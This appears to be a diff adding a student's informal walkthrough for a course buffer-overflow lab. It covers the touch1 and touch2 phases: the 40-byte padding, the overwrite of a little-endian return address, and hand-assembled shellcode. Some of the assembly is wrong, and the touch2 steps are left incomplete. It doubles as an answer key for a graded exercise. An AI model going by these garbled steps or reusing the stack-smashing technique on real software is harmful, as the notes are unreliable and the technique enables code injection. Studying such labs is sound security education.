@@ -1,0 +1,52 @@
+For Touch 1.
+in the folder of the target46,
+############
+In the thermal
+>> objdump -d ctarget
+############
+Find <getbuf> and <touch1>
+Read the first line under the word <getbuf>,
+(Mine is   "401650:	48 83 ec 28          	sub    $0x28,%rsp")
+to know how many bytes of "00 " to put in front of the address of touch 1.
+0x28 is 40 in decimal, so there should be 40 "00 "s.
+Then we put in the first line of address in touch 1, mine is  401668.
+So after 40 bytes we put 68 16 40, remember to reverse the order, and then put 00 00 00 00 00, because the address should by 8 bytes.
+So make a txt file called touch1.txt
+Write in
+"00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+68 16 40 00 00 00 00 00"
+############In the terminator
+>> cat touch1.txt | ./hex2raw | ./ctarget
+############
+And you pass touch 1!
+
+
+Touch 2
+write a file named "phase2.s"
+Type in[
+mov %0x69afe3c6, %rdi
+ret
+]
+0x69afe3c6 is my address in the cookie.txt
+############
+In the thermal
+>> gcc phase2.s
+>> objdump -d phase2.o
+############
+and the address is the first answer in touch 2,
+Mine is "48 c7 c7 c6 e3 af 69" and a "c3" in the next line.
+So the first line in touch2.txt is "48 c7 c7 c6 e3 af 69 c3"
+############In the terminator
+>> b getbuf
+>> r
+>> info r
+############
+Find rsp
+
+
+Then add 32 "00"s after the first line to get reach to 40 in the <getbuf>
+Look at the source code file in the "objdump -d ctarget" and look at the address of <touch 2>, mine is "401694", write that in the last line of the touch2.txt with 5 "00"s after the address to get 8 bytes.
